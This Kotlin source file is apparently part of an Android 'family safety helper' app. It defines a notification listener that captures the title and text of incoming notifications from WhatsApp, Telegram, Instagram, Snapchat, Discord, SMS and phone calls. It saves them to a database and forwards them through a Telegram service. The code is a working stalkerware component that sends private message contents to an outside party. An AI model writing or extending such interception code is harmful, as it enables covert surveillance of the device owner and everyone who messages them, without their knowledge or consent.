package com.family.safety.helper.services

import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import com.family.safety.helper.database.MonitoringDatabase
import com.family.safety.helper.database.NotificationEntity
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch

class NotificationListenerService : NotificationListenerService() {
    
    private lateinit var database: MonitoringDatabase
    private lateinit var telegramService: TelegramService
    private val scope = CoroutineScope(Dispatchers.IO)
    
    private val monitoredApps = setOf(
        "com.whatsapp",
        "org.telegram.messenger",
        "com.facebook.katana",
        "com.instagram.android",
        "com.twitter.android",
        "com.snapchat.android",
        "com.tiktokv.tiktok",
        "com.discord",
        "com.android.phone", // Phone calls
        "com.android.mms", // SMS
        "com.google.android.apps.messaging" // Messages
    )
    
    override fun onCreate() {
        super.onCreate()
        database = MonitoringDatabase.getDatabase(this)
        telegramService = TelegramService()
        telegramService.initialize(this)
    }
    
    override fun onNotificationPosted(sbn: StatusBarNotification?) {
        super.onNotificationPosted(sbn)
        
        sbn?.let { notification ->
            val packageName = notification.packageName
            
            if (packageName in monitoredApps) {
                processNotification(notification)
            }
        }
    }
    
    private fun processNotification(sbn: StatusBarNotification) {
        scope.launch {
            try {
                val notification = sbn.notification
                val extras = notification.extras
                
                val title = extras.getCharSequence("android.title")?.toString() ?: ""
                val text = extras.getCharSequence("android.text")?.toString() ?: ""
                val appName = getAppName(sbn.packageName)
                
                // Store in database for offline capability
                val notificationEntity = NotificationEntity(
                    packageName = sbn.packageName,
                    appName = appName,
                    title = title,
                    text = text,
                    timestamp = System.currentTimeMillis()
                )
                
                database.notificationDao().insertNotification(notificationEntity)
                
                // Try to send immediately if online
                val success = telegramService.sendNotificationAlert(
                    appName = appName,
                    title = title,
                    text = text,
                    timestamp = notificationEntity.timestamp
                )
                
                if (success) {
                    database.notificationDao().markAsSent(notificationEntity.id)
                }
                
            } catch (e: Exception) {
                e.printStackTrace()
            }
        }
    }
    
    private fun getAppName(packageName: String): String {
        return try {
            val applicationInfo = packageManager.getApplicationInfo(packageName, 0)
            packageManager.getApplicationLabel(applicationInfo).toString()
        } catch (e: Exception) {
            packageName
        }
    }
}
